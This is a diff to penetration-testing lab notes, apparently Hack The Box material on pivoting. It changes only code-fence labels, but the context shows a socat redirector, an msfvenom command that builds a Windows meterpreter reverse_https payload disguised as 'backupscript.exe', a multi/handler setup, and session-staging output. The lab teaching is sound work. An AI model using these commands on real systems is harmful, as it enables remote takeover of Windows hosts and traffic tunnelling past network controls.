@@ -3,7 +3,7 @@
 
 ## Starting Socat listener
 
-```sh
+```shellsession
 ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
 ```
 
@@ -11,7 +11,7 @@ Socat will listen on localhost on port `8080` and forward all the traffic to por
 
 ## Creating the Windows Payload
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -26,7 +26,7 @@ Keep in mind that we must transfer this payload to the Windows host. We can use 
 
 ## Starting MSF Console
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo msfconsole
 
 <SNIP>
@@ -34,7 +34,7 @@ masterofblafu@htb[/htb]$ sudo msfconsole
 
 ## Configuring & Starting the multi/handler
 
-```sh
+```shellsession
 msf6 > use exploit/multi/handler
 
 [*] Using configured payload generic/shell_reverse_tcp
@@ -53,7 +53,7 @@ We can test this by running our payload on the windows host again, and we should
 
 ## Establishing the Meterpreter Session
 
-```sh
+```shellsession
 [!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
 [*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
 [!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
